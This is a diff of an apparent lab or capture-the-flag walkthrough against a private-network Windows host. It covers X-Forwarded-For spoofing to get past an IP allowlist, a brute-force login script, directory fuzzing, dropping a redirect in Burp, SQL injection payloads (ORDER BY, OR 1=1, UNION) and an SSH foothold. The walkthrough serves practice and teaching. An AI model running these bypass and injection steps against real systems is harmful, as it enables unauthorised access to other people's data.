@@ -1,11 +1,11 @@
-# target IP 192.168.86.200
+# target IP 192.168.80.200
 
 ![login.php blocked - only 10.10.10.x allowed](https://github.com/user-attachments/assets/5a52c98f-0526-4c6b-a8e2-22820aaca06c)
 
 ```py
 import requests
 
-url = "http://192.168.86.200/login.php"
+url = "http://192.168.80.200/login.php"
 
 for i in range(256):
     ip = f"10.10.10.{i}"
@@ -31,7 +31,7 @@ for i in range(256):
 ```py
 import requests
 
-url = "http://192.168.86.200/login.php"
+url = "http://192.168.80.200/login.php"
 
 for i in range(256):
     ip = f"10.10.10.{i}"
@@ -94,7 +94,7 @@ for i in range(256):
 ![Burp proxy error - no response received from remote server](https://github.com/user-attachments/assets/61dbf70e-0933-4e0a-acd2-71a43e2a8e2b)
 
 ```py
-# python3 bruteforce_x_forwarded_for.py --url http://192.168.86.200/login.php --xff 10.10.10.0 --usernames "usernames.txt" --passwords "passwords.txt"
+# python3 bruteforce_x_forwarded_for.py --url http://192.168.80.200/login.php --xff 10.10.10.0 --usernames "usernames.txt" --passwords "passwords.txt"
 import argparse
 
 import requests
@@ -187,7 +187,7 @@ if __name__ == "__main__":
 
 ```
 
-> python3 bruteforce_x_forwarded_for.py --url http://192.168.86.200/login.php --xff 10.10.10.0 --usernames "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" --passwords "/usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-10000.txt"
+> python3 bruteforce_x_forwarded_for.py --url http://192.168.80.200/login.php --xff 10.10.10.0 --usernames "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" --passwords "/usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-10000.txt"
 
 - It shows all 200 status code
 
@@ -198,7 +198,7 @@ if __name__ == "__main__":
 - bruteforce -> not found
   ![bruteforce finished 170000/170000 - credentials not found](https://github.com/user-attachments/assets/ea32b22b-817e-41fe-ab4e-876f515a1f68)
 
-> sudo nmap 192.168.86.200 -Pn --open -sC -sV -O -oN scan.txt
+> sudo nmap 192.168.80.200 -Pn --open -sC -sV -O -oN scan.txt
 
 ![nmap scan - 22 OpenSSH, 80 PHP cli server, Windows host](https://github.com/user-attachments/assets/0a3fab28-54dc-43c2-b2bf-fd8b8d77bfb6)
 
@@ -206,19 +206,19 @@ if __name__ == "__main__":
 
 # subdomain not found
 
-> ffuf -u http://192.168.86.200 -H "Host:FUZZ.192.168.86.200" -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fc 404 -t 50 > result_ffuf.txt
+> ffuf -u http://192.168.80.200 -H "Host:FUZZ.192.168.80.200" -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fc 404 -t 50 > result_ffuf.txt
 
 ![ffuf subdomain fuzzing - no subdomain hits, saved to result_ffuf.txt](https://github.com/user-attachments/assets/308d2792-239c-42d7-a9d4-6f9e9fcd38b2)
 
 # found -> ip, IP, login, Login, LOGIN, home, Home, index, Index.php
 
-> ffuf -u http://192.168.86.200/FUZZ.php -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 -t 50
+> ffuf -u http://192.168.80.200/FUZZ.php -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 -t 50
 
 ![ffuf FUZZ.php raft-medium-directories - found login, home, index, ip](https://github.com/user-attachments/assets/a1f68392-76c7-4a9e-a7d2-34aaa8b2d1a9)
 
 # found -> login, nul.php
 
-> ffuf -u http://192.168.86.200/FUZZ.php -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/wordlists/wfuzz/general/big.txt -fc 404,302 -t 50
+> ffuf -u http://192.168.80.200/FUZZ.php -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/wordlists/wfuzz/general/big.txt -fc 404,302 -t 50
 
 ![ffuf FUZZ.php big.txt -fc 404,302 - found login, nul](https://github.com/user-attachments/assets/b31c29fa-9d2e-4f84-a52f-3927fd19d6f2)
 
@@ -226,23 +226,21 @@ if __name__ == "__main__":
 
 - --sc 302 -> look only 302
 
-> wfuzz -H "X-Forwarded-For: 10.10.10.0" --sc 302 -u http://192.168.86.200/FUZZ.php -w /usr/share/wordlists/wfuzz/general/big.txt
+> wfuzz -H "X-Forwarded-For: 10.10.10.0" --sc 302 -u http://192.168.80.200/FUZZ.php -w /usr/share/wordlists/wfuzz/general/big.txt
 
 ![wfuzz --sc 302 - found home, index](https://github.com/user-attachments/assets/4c297cf5-6263-4d78-86b6-b42ce97faf95)
 
-# 192.168.86.200/home.php
+# 192.168.80.200/home.php
 
 # turn on intercept server to client requests
 
 ![Burp response interception rules enabled](https://github.com/user-attachments/assets/52870492-12ad-4c6a-b425-6431ea834183)
 
-![Burp WebSocket interception rules - client-to-server and server-to-client on](https://github.com/user-attachments/assets/a20c7c6a-2c8a-4a80-a4b3-09f3ab6d3b33)
-
 # remove location in response header
 
 ![intercepted 302 response with Location login.php header](https://github.com/user-attachments/assets/3d5cea36-2007-4457-84d8-0b2f491b5a99)
 
-# arrived at 192.168.86.200/home.php
+# arrived at 192.168.80.200/home.php
 
 ![home.php after dropping redirect - Manage Employees list](https://github.com/user-attachments/assets/6d0a563d-3a0c-44e1-a7bc-b9fd16473f61)
 
@@ -272,15 +270,44 @@ if __name__ == "__main__":
 
 ## check column count -> 4
 
-> ' ORDER BY 1-- -
+> curl -X GET "http://192.168.80.200/home.php?action=search&first_name=%27+UNION+select+%2A+from+employees%27&last_name=lastname" -H "X-Forwarded-For: 10.10.10.0" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
 
-> http://192.168.86.200/home.php?action=search&first_name=%27+ORDER+BY+5--+-&last_name=
+> http://192.168.80.200/home.php?action=search&first_name=%27+OR+1%3D1--+-&last_name=
+> ![](image.png)
+
+> http://192.168.80.200/home.php?action=search&first_name=%27+ORDER+BY+5--+-&last_name=
 > ![ORDER BY 4 works - employees sorted by birth date](https://github.com/user-attachments/assets/c0f6c22b-308b-4ba4-a612-bffc0560d2a2)
 > ![ORDER BY 1 works - employees sorted by Id](https://github.com/user-attachments/assets/da2e1c59-ea9c-4da1-8a15-b9f00c85f795)
 > ![ORDER BY 5 fails - Number of Employees 0, column count is 4](https://github.com/user-attachments/assets/2f657bd3-2fce-496a-b4ad-d4a84ad053d2)
 
-> ' UNION select * from employees'
-> http://192.168.86.200/home.php?action=search&first_name=%27+UNION+select+*+from+employees%27&last_name=lastname
+> ' UNION select * from employees
+> http://192.168.80.200/home.php?action=search&first_name=%27+UNION+select+*+from+employees%27&last_name=lastname
 > ![UNION select PoC - Number of Employees 0](https://github.com/user-attachments/assets/7b7a5604-d4dd-4607-b1c0-624c00dc59c8)
 
-curl -X GET "http://192.168.86.200/home.php?action=search&first_name=%27+UNION+select+%2A+from+employees%27&last_name=lastname" -H "X-Forwarded-For: 10.10.10.0" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+# This one is weirdly not a data?? what is this?
+
+> ![](image_1.png)
+
+> ssh Jeff@192.168.80.200
+
+![](image_3.png)
+
+# local.txt
+
+> type local.txt
+
+![](image_4.png)
+
+> whoami /priv
+
+![](image_5.png)
+
+# It doesn't not include vulnerabilities
+
+Privilege Name Description State
+============================= ==================================== =======
+SeShutdownPrivilege Shut down the system Enabled
+SeChangeNotifyPrivilege Bypass traverse checking Enabled
+SeUndockPrivilege Remove computer from docking station Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+SeTimeZonePrivilege Change the time zone Enabled
